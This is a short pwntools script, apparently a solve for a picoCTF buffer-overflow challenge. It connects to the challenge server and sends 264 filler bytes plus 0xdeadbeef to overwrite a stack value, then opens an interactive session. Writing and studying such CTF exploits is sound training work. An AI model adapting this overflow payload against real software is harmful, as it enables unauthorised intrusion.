#!/usr/bin/python3
from pwn import *
import struct

# io = process(b'./chall')
io = remote(b"mars.picoctf.net", 31890)

deadbeef = struct.pack("I", 0xdeadbeef)

payload = b'A' * 264 + deadbeef

io.sendlineafter(b'?\n', payload)

log.info(io.clean())

io.interactive()